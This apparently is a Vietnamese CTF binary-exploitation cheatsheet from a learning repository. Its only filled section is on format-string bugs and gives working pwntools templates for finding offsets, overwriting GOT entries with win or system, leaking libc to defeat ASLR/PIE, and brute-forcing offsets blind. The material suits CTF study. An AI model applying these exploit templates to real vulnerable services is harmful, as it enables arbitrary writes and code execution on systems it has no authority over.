# Cheatsheet — PWN

> Lane P1. Khung theo tier trong README mục 2. Mỗi kỹ thuật ghi: *nhận diện → cách làm → gadget/lệnh → link exploit thật*.

**Công cụ:** pwntools, `cyclic`, ROPgadget/ropper/angrop, one_gadget, libc-database/libc.rip, GDB + pwndbg/gef, `checksec`, Ghidra/IDA.

```bash
checksec ./bin
cyclic 200 ; cyclic -l 0x6161...   # tìm offset
ROPgadget --binary ./bin | grep 'pop rdi'
one_gadget ./libc.so.6
```

**Bộ tiện ích trong repo** ([`exploits/pwn/`](../exploits/pwn/) — bản đồ phụ thuộc: [`MAINTAINING.md`](../exploits/pwn/MAINTAINING.md)):
- [`retry/`](../exploits/pwn/retry/) — khung chạy lại tới khi trúng (ASLR, partial overwrite, brute canary, race). Viết `attempt(i)` rồi đưa cho `retry()`. Template: flag / shell / parallel.
- [`shellcode/`](../exploits/pwn/shellcode/) — catalog shellcode đã test: `from shellcodes import SC`.

## T1 — Stack BOF (ret2win, ret2shellcode)
## T2 — Format string (leak, GOT overwrite)

> **Chi tiết đầy đủ (cơ chế, biến tấu, template mọi tình huống, syntax pwnld): [`pwn/fmtstr.md`](pwn/fmtstr.md)**

**Nhận diện:** chương trình gọi `printf(input)` không format → gửi `%p %p %p` thấy leak.
Ghi được số tuỳ ý vào địa chỉ tuỳ ý (`%n`) = arbitrary write → đè GOT / return addr / biến cờ.

**Dò OFFSET** (chỉ số tham số stack = vị trí input của bạn):
```python
io.sendline(b"AAAABBBB" + b"|%p" * 10)      # đếm %p thứ mấy ra 0x4141...  -> offset
io.sendline(b"AAAA|%6$p|%7$p|%8$p")          # hoặc positional cho nhanh (64-bit dùng 8 byte "AAAAAAAA")
```

**Cách làm — mặc định `fmtstr_payload` (đã biết offset):**
```python
# fmtstr_payload(offset, {addr: val}, numbwritten=0, write_size='byte')
#  write_size='byte' (mặc định) -> %hhn, tránh in hàng tỉ ký tự; tự tính %c, tự chèn địa chỉ
context.binary = exe = ELF('./chall', checksec=False)   # BẮT BUỘC để biết 32/64-bit
payload = fmtstr_payload(OFFSET, {exe.got['puts']: exe.sym['win']})
io.sendlineafter(b'> ', payload)
```
Templates:
```python
fmtstr_payload(OFF, {exe.got['exit']: exe.sym['win']})                    # GOT overwrite
fmtstr_payload(OFF, {exe.got['puts']: exe.sym['win'], exe.sym['f']: 1})   # ghi nhiều cặp
fmtstr_payload(OFF, {exe.got['p']: exe.sym['win'] & 0xffff}, write_size='short')  # partial
fmtstr_payload(OFF, {exe.got['printf']: libc.sym['system']})             # sau khi leak libc
```
Leak-rồi-ghi (bypass PIE/ASLR, chương trình cho nhập 2 lần):
```python
io.sendlineafter(b'> ', b'%15$p'); leak = int(io.recvline(), 16)
libc.address = leak - libc.sym['<hàm_leak>']
io.sendlineafter(b'> ', fmtstr_payload(OFF, {exe.got['printf']: libc.sym['system']}))
```

**`FmtStr` — chỉ khi BLIND / chưa biết offset VÀ chương trình echo output** (tự brute offset):
```python
def send(p):
    io = remote('host', 1337); io.sendlineafter(b'in: ', p)
    d = io.recvall(); io.close(); return d          # PHẢI trả output để nó dò offset
fmt = FmtStr(execute_fmt=send)                      # fmt.offset = offset tự dò
fmt.write(exe.got['puts'], exe.sym['win']); fmt.write(exe.sym['flag'], 1)
fmt.execute_writes()                                # gửi thật (gộp tối ưu)
```

**Chọn cái nào:** ~90% dùng `fmtstr_payload`. `FmtStr` chỉ cho blind-có-echo (không echo → nó không dò được).
Partial overwrite xác suất (1/16, 1/256) → bọc trong [`retry/`](../exploits/pwn/retry/).
**Bẫy:** ghi trúng rác = sai OFFSET (dò lại, đừng đoán); thiếu `context.binary` → sai độ rộng địa chỉ; kiểm chứng 1 lần dưới GDB (break trước `printf`).
Ví dụ thật: [`FSB_Write_Using_n/exploit.py`](../../../../learn/pwnable/tutorial/fsb/FSB_Write_Using_n/exploit.py)

## T3 — ROP bypass NX (ret2libc/plt/syscall, ret2csu, stack pivot)
## T4 — Bypass mitigation (leak canary/PIE, SROP)
## T5 — Shellcoding (ORW seccomp, alphanumeric)
Kho shellcode đã test: [`exploits/pwn/shellcode/`](../exploits/pwn/shellcode/) — `from shellcodes import SC`. Chọn theo ràng buộc (độ dài / null / seccomp / NX) xem README ở đó. Seccomp: `seccomp-tools dump ./bin` trước.
## T6 — Heap intro (UAF, double free, tcache poisoning)
## T7 — Heap trung cấp (fastbin dup, unsorted leak, large bin)
## T8 — Heap nâng cao (safe-linking, house of ...)
## T9 — FILE/FSOP
## T10 — Hijack control-flow (exit handlers, largebin→write)
## T11+ — Kernel / misc (stretch)

<!-- Mỗi lần giải xong 1 tier: dán snippet + link exploits/pwn/<tên>/ -->
